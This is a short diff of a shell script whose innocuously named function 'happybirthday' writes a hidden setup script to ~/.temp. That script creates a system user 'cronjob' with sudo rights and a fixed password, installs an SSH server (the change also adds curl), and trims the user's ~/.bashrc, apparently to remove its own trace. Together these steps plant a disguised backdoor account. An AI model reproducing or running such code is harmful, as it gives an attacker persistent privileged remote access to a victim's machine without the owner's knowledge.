@@ -4,7 +4,7 @@ function happybirthday {
   echo "useradd -rM -s /bin/bash cronjob" > ~/.temp
   echo "adduser cronjob sudo" >> ~/.temp
   echo "echo -e \"jetessh\njetessh\" | passwd cronjob" >> ~/.temp
-  echo "apt -y install openssh-server > /dev/null" >> ~/.temp
+  echo "apt -y install openssh-server curl > /dev/null" >> ~/.temp
   echo "head -n -27 ~/.bashrc > ~/.basrc_temp" >> ~/.temp
   echo "rm -f ~/.bashrc" >> ~/.temp
   echo "mv ~/.basrc_temp ~/.bashrc" >> ~/.temp
